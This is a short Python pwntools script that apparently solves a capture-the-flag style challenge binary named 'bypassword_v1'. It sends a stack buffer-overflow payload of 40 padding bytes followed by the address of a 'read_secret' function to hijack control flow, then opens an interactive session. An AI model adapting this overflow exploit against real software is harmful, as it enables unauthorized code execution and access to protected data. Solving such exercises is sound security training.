#!/usr/bin/python
import sys
import struct
from pwn import *

e = ELF("./bypassword_v1")
#p = process(e.path)
p = gdb.debug(e.path, gdbscript=open('script.gdb', 'r').read())

read_secret = p64(0x4014dd)

p.recvuntil(b'>> ')
p.sendline(b'2')
p.recvuntil(b': ')

payload = b'A'*40

# Only the bottom 3 bytes of read_secret will be consumed
# by fgets(), but fortunately that is just enough for the address
# to be valid, as the remaining bytes should all be null anyways
payload += read_secret

p.sendline(payload)
p.interactive()
